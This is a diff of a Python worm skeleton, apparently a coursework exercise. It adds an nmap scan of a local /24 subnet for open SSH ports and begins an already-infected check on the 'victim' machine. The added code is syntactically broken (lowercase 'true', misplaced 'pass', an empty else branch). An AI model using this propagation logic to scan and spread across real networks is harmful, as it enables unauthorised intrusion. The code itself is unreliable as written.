@@ -182,12 +182,18 @@ def getMyIP(interface):
 # @return - a list of IP addresses on the same network
 #######################################################
 def getHostsOnTheSameNetwork():
+	portScanner = nmap.PortScanner()
 	
-	# TODO: Add code for scanning
-	# for hosts on the same network
-	# and return the list of discovered
-	# IP addresses.	
-	pass
+	# Scan the network for systems whose
+	# port 22 is open (that is, there is possibly
+	# SSH running there). 
+	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+		
+	# Scan the network for hoss
+	hostInfo = portScanner.all_hosts()	
+	#to do need to see if hostinfo return as a dictionary?
+	return hostInfo
+
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -203,12 +209,15 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
+	if(isInfectedSystem()==true):
 	pass
+	else:
+	
 # TODO: Get the IP of the current system
-
+	getMyIP(b"eth0")
 
 # Get the hosts on the same network
-networkHosts = getHostsOnTheSameNetwork()
+	networkHosts = getHostsOnTheSameNetwork()
 
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
